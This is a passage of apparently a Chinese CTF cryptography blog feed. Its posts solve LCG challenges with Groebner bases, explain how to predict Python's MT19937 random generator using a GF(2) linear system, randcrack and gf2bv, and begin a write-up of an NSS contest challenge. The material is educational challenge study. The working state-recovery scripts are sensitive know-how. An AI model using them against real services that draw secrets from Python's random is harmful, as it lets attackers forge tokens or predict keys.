4210708565756085546166628092305272946875271265519042415557992126068008771912350261353051723099451508635860890024976, 15756647314623328166703743185062683999338522182906057851774027566229961399311096111735183330556202175961402609739909]</span></span><br></pre></td></tr></table></figure>

<p>因为此时我们定义的环是ZZ，所以直接使用即可。</p>
<p>我们也可以使用以下代码直接提取得到参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = ZZ(-I[<span class="number">0</span>].univariate_polynomial()(<span class="number">0</span>))</span><br><span class="line">b = ZZ(-I[<span class="number">1</span>].univariate_polynomial()(<span class="number">0</span>))</span><br><span class="line">n = ZZ(I[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>

<h2 id="二元lcg"><a href="#二元lcg" class="headerlink" title="二元lcg"></a>二元lcg</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) == <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">my_LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed1 , seed2</span>):</span><br><span class="line">        self.state = [seed1,seed2]</span><br><span class="line">        self.n = getPrime(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            self.a = bytes_to_long(flag[:<span class="number">8</span>])</span><br><span class="line">            self.b = bytes_to_long(flag[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">            self.c = bytes_to_long(flag[<span class="number">16</span>:])</span><br><span class="line">            <span class="keyword">if</span> self.a &lt; self.n <span class="keyword">and</span> self.b &lt; self.n <span class="keyword">and</span> self.c &lt; self.n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        new = (self.a * self.state[-<span class="number">1</span>] + self.b * self.state[-<span class="number">2</span>] + self.c) % self.n</span><br><span class="line">        self.state.append( new )</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    lcg = my_LCG(getRandomInteger(<span class="number">64</span>),getRandomInteger(<span class="number">64</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data = &quot;</span> + <span class="built_in">str</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span> + <span class="built_in">str</span>(lcg.n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main() </span><br><span class="line"></span><br><span class="line"><span class="comment"># data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]</span></span><br><span class="line"><span class="comment"># n = 10104483468358610819</span></span><br></pre></td></tr></table></figure>

<p>与上题同理，我们可以列出如下的f</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = (a*d[<span class="number">1</span>]+b*d[<span class="number">0</span>]+c-d[<span class="number">2</span>])</span><br><span class="line">f2 = (a*d[<span class="number">2</span>]+b*d[<span class="number">1</span>]+c-d[<span class="number">3</span>])</span><br><span class="line">f3 = (a*d[<span class="number">3</span>]+b*d[<span class="number">2</span>]+c-d[<span class="number">4</span>])</span><br></pre></td></tr></table></figure>

<p>同样用groebner_basis求解。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = [<span class="number">2626199569775466793</span>, <span class="number">8922951687182166500</span>, <span class="number">454458498974504742</span>, <span class="number">7289424376539417914</span>, <span class="number">8673638837300855396</span>]</span><br><span class="line">n = <span class="number">10104483468358610819</span></span><br><span class="line">PR.&lt;a,b,c&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = (a*d[<span class="number">1</span>]+b*d[<span class="number">0</span>]+c-d[<span class="number">2</span>])</span><br><span class="line">f2 = (a*d[<span class="number">2</span>]+b*d[<span class="number">1</span>]+c-d[<span class="number">3</span>])</span><br><span class="line">f3 = (a*d[<span class="number">3</span>]+b*d[<span class="number">2</span>]+c-d[<span class="number">4</span>])</span><br><span class="line">Fs = [f1, f2, f3]</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">    <span class="keyword">assert</span> b.degree() == <span class="number">1</span></span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    m += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(mi)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>

<h2 id="未知n"><a href="#未知n" class="headerlink" title="未知n"></a>未知n</h2><p>这个具体还没咋搞明白为啥groebner基能直接解不带模数的同余方程，自己生成数据检测了一下，感觉需要已知的数据多一点才比较好求。而且也是有概率的。已知的数据越多，成功率越高？这点还不太懂，知道的佬们教教ww</p>
<p>自己先测试一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&#x27;cazy&#123;L1near_Equ4t1on6_1s_34sy&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">len</span>(flag) == <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">my_LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed1, seed2</span>):</span><br><span class="line">        self.state = [seed1, seed2]</span><br><span class="line">        self.n = getPrime(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            self.a = bytes_to_long(flag[:<span class="number">8</span>])</span><br><span class="line">            self.b = bytes_to_long(flag[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">            self.c = bytes_to_long(flag[<span class="number">16</span>:])</span><br><span class="line">            <span class="keyword">if</span> self.a &lt; self.n <span class="keyword">and</span> self.b &lt; self.n <span class="keyword">and</span> self.c &lt; self.n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        new = (self.a * self.state[-<span class="number">1</span>] + self.b * self.state[-<span class="number">2</span>] + self.c) % self.n</span><br><span class="line">        self.state.append(new)</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    lcg = my_LCG(getRandomInteger(<span class="number">64</span>), getRandomInteger(<span class="number">64</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data = &quot;</span> + <span class="built_in">str</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span> + <span class="built_in">str</span>(lcg.n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#data = [2728632062230380206, 12070822170137686159, 4628962860070801596, 5238045249824901416, 11507634387102815130, 10233693222250539355, 3333309580382659734, 3541198295283958454]</span></span><br><span class="line"><span class="comment">#n = 12392832629919082063</span></span><br></pre></td></tr></table></figure>

<p>在不知道n的情况下用groebner基解一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">my_LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed1, seed2,a,b,c,n</span>):</span><br><span class="line">        self.state = [seed1, seed2]</span><br><span class="line">        self.n = getPrime(<span class="number">64</span>)</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.c = c</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        new = (self.a * self.state[-<span class="number">1</span>] + self.b * self.state[-<span class="number">2</span>] + self.c) % self.n</span><br><span class="line">        self.state.append(new)</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line">d=[<span class="number">2728632062230380206</span>, <span class="number">12070822170137686159</span>, <span class="number">4628962860070801596</span>, <span class="number">5238045249824901416</span>, <span class="number">11507634387102815130</span>, <span class="number">10233693222250539355</span>, <span class="number">3333309580382659734</span>, <span class="number">3541198295283958454</span>]</span><br><span class="line">R=PolynomialRing(ZZ,names=[<span class="string">&#x27;seed1&#x27;</span>,<span class="string">&#x27;seed2&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br><span class="line">seed1,seed2,a,b,c=R.gens()</span><br><span class="line">l=my_LCG(seed1,seed2,a,b,c,n)</span><br><span class="line">fs=[l.<span class="built_in">next</span>()-d[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">res = Ideal(fs).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[seed1 + 12289959268929185958, seed2 + 2988362793775166922, a + 6902541827472099082, b + 4217334257707841561, c + 5533442069738943190, 12392832629919082063]</span></span><br></pre></td></tr></table></figure>

<p>发现是能进行求解的。经过检测发现数据大概在5，6个左右能出的概率就蛮小了。具体原理还是不咋懂，当个黑盒直接用吧XD.</p>
<p>补档:请教了<a href="https://march-7th.tech/">三顺七</a>师傅，有数个方程的根足够小的情况下（比模数小很多），其解极大概率是该格基空间下的最小向量。也就是说当根满足与模数的大小关系时，可以用以上方式求解(大概吧…</p>
]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>MT19937</title>
    <url>/2025/04/11/MT19937/</url>
    <content><![CDATA[<p>owo</p>
<p>最近碰到蛮多涉及伪随机数预测的题目，顺便总结一下，常看常新。</p>
<span id="more"></span>

<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>MT19937是一种周期很长的的伪随机数生成算法，该算法的周期为2$^{19937}$−1，故名为 MT19937。可以快速的产生高质量的伪随机数，主要分为三部分。</p>
<p>1.利用seed初始化624的状态<br>2.对状态进行旋转<br>3.根据状态提取伪随机数</p>
<p>其中 32 位的 MT19937 Python 代码实现为:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">0xFFFFFFFF</span> &amp; x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MT19937</span>:</span><br><span class="line">    <span class="comment"># 初始化</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.mt = [<span class="number">0</span>] * <span class="number">624</span></span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">624</span>):</span><br><span class="line">            self.mt[i] = _int32(<span class="number">1812433253</span> * (self.mt[i - <span class="number">1</span>] ^ self.mt[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取伪随机数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_number</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.mti == <span class="number">0</span>:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[self.mti]</span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">11</span></span><br><span class="line">        y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">        y = y ^ y &lt;&lt; <span class="number">15</span> &amp; <span class="number">4022730752</span></span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">18</span></span><br><span class="line">        self.mti = (self.mti + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line">        <span class="keyword">return</span> _int32(y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 旋转状态</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">624</span>):</span><br><span class="line">            y = _int32((self.mt[i] &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">            self.mt[i] = (y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i + <span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ <span class="number">0x9908b0df</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>更多详细关于该算法的知识可以参考<a href="https://cryptography-wiki.github.io/stream/prng/MT19937/#_1">MT19937 - Cryptography-Wiki</a></p>
<p>python中的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.getrandbits()</span><br></pre></td></tr></table></figure>

<p>实际上就是使用的梅森旋转(Mersenne Twister)。</p>
<p>对于不是32位的随机数生成，经过测试我们有以下发现</p>
<p>1，若生成位数小于32位，实际上是由生成的32位随机数在对应位上截断形成的。</p>
<p>举个栗子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">1</span>)<span class="comment">#掷随机数种子为1从而确保随机数产生的一致性</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(random.getrandbits(<span class="number">32</span>)))</span><br><span class="line">random.seed(<span class="number">1</span>)<span class="comment">#重新掷随机数种子</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(random.getrandbits(<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x2265b1f5</span></span><br><span class="line"><span class="number">0x2265</span></span><br></pre></td></tr></table></figure>

<p>这里我们生成了一个32位的随机数并将其转为16进制用来让我们观察规律，然后重置种子再生成一个16位的随机数。一眼看出其与上一个32位的前16位一致。验证了我们的结论。</p>
<p>2，若生成位数大于32位，本质是由多次生成的32位随机数拼接产生的。</p>
<p>同样举个栗子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">1</span>)<span class="comment">#掷随机数种子为1从而确保随机数产生的一致性</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(random.getrandbits(<span class="number">32</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(random.getrandbits(<span class="number">32</span>)))</span><br><span class="line">random.seed(<span class="number">1</span>)<span class="comment">#重新掷随机数种子</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(random.getrandbits(<span class="number">64</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x2265b1f5</span></span><br><span class="line"><span class="number">0x91b7584a</span></span><br><span class="line"><span class="number">0x91b7584a2265b1f5</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个样例中我们生成了2次32位的随机数然后又生成了一次64位随机数，我们观察64位随机数，我们发现，其高32位就是我们第二次生成的随机数，低32位是第一次生成的随机数。也就是说大于32位的随机数是以第一次生成的32位随机数作为低位向高位生长的。</p>
<p>再来看个例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">1</span>)<span class="comment">#掷随机数种子为1从而确保随机数产生的一致性</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(random.getrandbits(<span class="number">32</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(random.getrandbits(<span class="number">32</span>)))</span><br><span class="line">random.seed(<span class="number">1</span>)<span class="comment">#重新掷随机数种子</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(random.getrandbits(<span class="number">36</span>)))</span><br><span class="line"></span><br><span class="line"><span class="number">0x2265b1f5</span></span><br><span class="line"><span class="number">0x91b7584a</span></span><br><span class="line"><span class="number">0x92265b1f5</span></span><br></pre></td></tr></table></figure>

<p>因为每个十六进制位对应 4 位二进制，所以我们用36来便于观察，不难发现向高位生长时其实跟小于32位一样是从高位开始取。</p>
<h1 id="关于预测"><a href="#关于预测" class="headerlink" title="关于预测"></a>关于预测</h1><p>现在其实有蛮多的库能用了，不过还是先看看最基本的方法吧</p>
<h2 id="1-基础脚本"><a href="#1-基础脚本" class="headerlink" title="1,基础脚本"></a>1,基础脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">construct_a_row</span>(<span class="params">RNG</span>): </span><br><span class="line">    row = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19968</span>//<span class="number">32</span>):</span><br><span class="line">        tmp = RNG.getrandbits(<span class="number">32</span>)</span><br><span class="line">        row += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(tmp)[<span class="number">2</span>:].zfill(<span class="number">32</span>)))</span><br><span class="line">    <span class="keyword">return</span> row</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 构造线性方程组的矩阵 </span></span><br><span class="line">L = [] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">19968</span>): </span><br><span class="line">    state = [<span class="number">0</span>]*<span class="number">624</span>  <span class="comment"># MT19937使用624个32位整数作为状态 </span></span><br><span class="line">    <span class="comment"># 构造一个只有一位为1,其他都为0的序列 </span></span><br><span class="line">    temp = <span class="string">&quot;0&quot;</span>*i + <span class="string">&quot;1&quot;</span>*<span class="number">1</span> + <span class="string">&quot;0&quot;</span>*(<span class="number">19968</span>-<span class="number">1</span>-i) </span><br><span class="line">    <span class="comment"># 将这个序列分成624段,每段32位,转换为整数 </span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>): </span><br><span class="line">        state[j] = <span class="built_in">int</span>(temp[<span class="number">32</span>*j:<span class="number">32</span>*j+<span class="number">32</span>], <span class="number">2</span>) </span><br><span class="line">     </span><br><span class="line">    RNG = Random() </span><br><span class="line">    RNG.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">624</span>]),<span class="literal">None</span>))</span><br><span class="line">    L.append(construct_a_row(RNG)) </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将L转换为GF(2)上的矩阵（二进制域） </span></span><br><span class="line">L = Matrix(GF(<span class="number">2</span>),L)</span><br><span class="line"><span class="built_in">print</span>(L.nrows(), L.ncols())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MT19937_re</span>(<span class="params">state</span>): </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="comment"># 构造目标向量R </span></span><br><span class="line">        R = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> state:</span><br><span class="line">            R += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">32</span>)))</span><br><span class="line">         </span><br><span class="line">        R = vector(GF(<span class="number">2</span>), R)</span><br><span class="line">        s = L.solve_left(R)  <span class="comment"># 这里可能会抛出异常 </span></span><br><span class="line">         </span><br><span class="line">        <span class="comment"># 将解转换为二进制字符串 </span></span><br><span class="line">        init = <span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>,s))) </span><br><span class="line">        state = [] </span><br><span class="line">        <span class="comment"># 将解重新分割成624个32位整数 </span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>): </span><br><span class="line">            state.append(<span class="built_in">int</span>(init[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>],<span class="number">2</span>)) </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 创建新的RNG并设置恢复出的状态 </span></span><br><span class="line">        RNG1 = Random() </span><br><span class="line">        RNG1.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">624</span>]),<span class="literal">None</span>)) </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> RNG1</span><br><span class="line">         </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line">RNG = MT19937_re()</span><br></pre></td></tr></table></figure>

<p>不过还是得根据具体情况来分析。不过这种方法在构造矩阵时花的时间其实挺长的，试了一下差不多得十分钟。</p>
<h2 id="2-直接使用randcrack库进行预测"><a href="#2-直接使用randcrack库进行预测" class="headerlink" title="2,直接使用randcrack库进行预测"></a>2,直接使用randcrack库进行预测</h2><p>无脑调用库就行(bushi</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random <span class="comment">#导入random库（Python内置了）</span></span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span>  RandCrack</span><br><span class="line"><span class="comment">#你可以掷随机数种子来确保预测的有效性， 不过random预测的时候默认以当前时间作为随机数种子</span></span><br><span class="line">rc = RandCrack()<span class="comment">#实例化randcrack类</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):<span class="comment">#循环624次</span></span><br><span class="line">    rc.submit(random.getrandbits(<span class="number">32</span>))<span class="comment">#每次循环提交一个32位random生成的随机数</span></span><br><span class="line"><span class="built_in">print</span>(random.getrandbits(<span class="number">64</span>))<span class="comment">#利用random库获取一个64位的随机数（你可以修改为任意位数）</span></span><br><span class="line"><span class="built_in">print</span>(rc.predict_getrandbits(<span class="number">64</span>))<span class="comment">#利用randcrack获取的随机数</span></span><br></pre></td></tr></table></figure>

<p>不过原版的randcrack仿佛只能特性针对“624”和“32位”对其他情况都没法打，不过有师傅做了优化（<a href="https://github.com/guoql666/pyrandcracker%EF%BC%89%E5%8F%AF%E4%BB%A5%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%E3%80%82">https://github.com/guoql666/pyrandcracker）可以了解一下。</a></p>
<h2 id="3-gf2bv"><a href="#3-gf2bv" class="headerlink" title="3,gf2bv"></a>3,gf2bv</h2><p>无敌真神,maple师傅整的一个库。其实是maple佬写出来求解GF(2)上线性方程组的。恰好MT19937在GF(2)上关于初始状态也是线性递推，所以拿来搞MT也不是不行。</p>
<p>我们还是先生成足够的随机数来检验一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">1</span>)</span><br><span class="line">out=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>):</span><br><span class="line">    out.append(random.getrandbits(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#print(out)</span></span><br><span class="line"><span class="built_in">print</span>(random.getrandbits(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#198</span></span><br></pre></td></tr></table></figure>

<p>注意这里生成2496个是因为我选的是八位的随机数。</p>
<p>然后我们用gf2bv预测一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gf2bv <span class="keyword">import</span> LinearSystem</span><br><span class="line"><span class="keyword">from</span> gf2bv.crypto.mt <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mt19937</span>(<span class="params">bs, out</span>):</span><br><span class="line">    lin = LinearSystem([<span class="number">32</span>] * <span class="number">624</span>)</span><br><span class="line">    mt = lin.gens()</span><br><span class="line"></span><br><span class="line">    rng = MT19937(mt)</span><br><span class="line">    <span class="comment">#rng.getrandbits(175)</span></span><br><span class="line">    zeros = [rng.getrandbits(bs) ^ o <span class="keyword">for</span> o <span class="keyword">in</span> out] + [mt[<span class="number">0</span>] ^ <span class="number">0x80000000</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;solving...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sol = lin.solve_one(zeros)</span><br><span class="line"></span><br><span class="line">    rng = MT19937(sol)</span><br><span class="line">    pyrand = rng.to_python_random()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>):</span><br><span class="line">        out.append(pyrand.getrandbits(<span class="number">8</span>))</span><br><span class="line">    <span class="built_in">print</span>(pyrand.getrandbits(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">1</span>)</span><br><span class="line">out=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>):</span><br><span class="line">    out.append(random.getrandbits(<span class="number">8</span>))</span><br><span class="line">mt19937(<span class="number">8</span>, out)</span><br></pre></td></tr></table></figure>

<p>这里，zeros.append()的时候需要注意和题目中获取randbits的方式一致。生成的pyrand其实是它的初始状态，需要预测哪个就往后递推就行了。</p>
<p>(ps:这个库仿佛只能装到Linux系统里，它的一个依赖项没有windows的版本</p>
<h1 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h1>]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>NSS 4th</title>
    <url>/2025/09/05/NSS%204th/</url>
    <content><![CDATA[<p>owo</p>
<p>依旧是赛后复现，主要是锻炼一下cuso的使用</p>
<span id="more"></span>

<h1 id="Guillotine"><a href="#Guillotine" class="headerlink" title="Guillotine"></a>Guillotine</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;NSSCTF&#123;**************************&#125;&#x27;</span></span><br><span class="line">p, n, m = <span class="number">257</span>, <span class="number">36</span>, <span class="number">50</span></span><br><span class="line">e = [choice(<span class="built_in">range</span>(-<span class="number">3</span>,<span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">secret = random.randrange(<span class="number">1</span>,<span class="number">2</span>^n)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="number">1337</span>))</span><br><span class="line">A = [[[random.randrange(p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">B = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    b = (<span class="built_in">sum</span>(A[time][j][(secret &gt;&gt; j) &amp; <span class="number">1</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))+e[time])%p</span><br><span class="line">    B.append(b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;give you B:&quot;</span>,B)</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The time for defiance is 